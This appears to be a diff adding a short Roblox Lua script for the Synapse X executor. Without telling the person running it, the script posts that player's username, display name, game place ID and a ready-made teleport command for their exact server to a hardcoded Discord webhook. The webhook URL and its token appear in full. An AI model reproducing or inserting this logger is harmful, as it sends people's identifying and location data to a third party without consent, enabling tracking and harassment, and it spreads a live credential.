@@ -1,0 +1,30 @@
+local msg = "`Name: " .. game.Players.LocalPlayer.Name .. "`"
+local url = "https://discord.com/api/webhooks/1048310334773018754/Y8yN04smHaa9sM2sykvqOlI_qM_5uokAeqn0QZQGri9OEXfPZCeq5cJV7S3EpQUdZ7X-"
+
+syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
+
+local msg = "`DisplayName: " .. game.Players.LocalPlayer.DisplayName .. " `"
+local url = "https://discord.com/api/webhooks/1048310334773018754/Y8yN04smHaa9sM2sykvqOlI_qM_5uokAeqn0QZQGri9OEXfPZCeq5cJV7S3EpQUdZ7X-"
+
+syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
+
+
+local msg = "`Script:`"
+local url = "https://discord.com/api/webhooks/1048310334773018754/Y8yN04smHaa9sM2sykvqOlI_qM_5uokAeqn0QZQGri9OEXfPZCeq5cJV7S3EpQUdZ7X-"
+
+syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
+
+local msg = ('`game:GetService("TeleportService"):TeleportToPlaceInstance(') .. game.PlaceId .. ',"' .. game.JobId .. '")`'
+local url = "https://discord.com/api/webhooks/1048310334773018754/Y8yN04smHaa9sM2sykvqOlI_qM_5uokAeqn0QZQGri9OEXfPZCeq5cJV7S3EpQUdZ7X-"
+
+syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
+
+local msg = "`Game:`"
+local url = "https://discord.com/api/webhooks/1048310334773018754/Y8yN04smHaa9sM2sykvqOlI_qM_5uokAeqn0QZQGri9OEXfPZCeq5cJV7S3EpQUdZ7X-"
+
+syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
+
+local msg = "https://www.roblox.com/games/" .. game.PlaceId .. "/"
+local url = "https://discord.com/api/webhooks/1048310334773018754/Y8yN04smHaa9sM2sykvqOlI_qM_5uokAeqn0QZQGri9OEXfPZCeq5cJV7S3EpQUdZ7X-"
+
+syn.request({Url = url, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({["content"]=msg})})
